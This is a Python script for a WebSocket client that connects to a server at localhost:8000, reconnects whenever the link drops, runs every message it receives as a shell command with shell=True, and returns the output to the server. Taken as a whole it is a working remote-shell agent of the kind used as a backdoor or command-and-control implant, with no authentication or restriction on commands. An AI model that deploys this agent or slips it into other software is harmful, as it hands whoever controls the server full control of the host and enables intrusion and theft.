import asyncio
import websockets
import subprocess
import logging

logging.basicConfig(level=logging.INFO)

class WebSocketClient:
    def __init__(self, uri):
        self.uri = uri

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.uri) as websocket:
                    logging.info("Connected to the server")
                    await self.handle_messages(websocket)
            except websockets.ConnectionClosed:
                logging.error("Connection closed, retrying in 2 seconds...")
                await asyncio.sleep(2)
            except Exception as e:
                logging.error(f"Error: {e}")
                break

    async def handle_messages(self, websocket):
        while True:
            command = await websocket.recv()
            logging.info(f"Received command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            await self.send_response(websocket, result)

    async def send_response(self, websocket, result):
        response_message = ""
        if result.stdout:
            response_message += f"Output: {result.stdout}\n"
        if result.stderr:
            response_message += f"Error: {result.stderr}\n"
        if response_message:
            await websocket.send(response_message.strip())
            logging.info(f"Sent response to server: {response_message.strip()}")

    async def run(self):
        await self.connect()

if __name__ == "__main__":
    client = WebSocketClient("ws://localhost:8000/ws")
    asyncio.run(client.run())
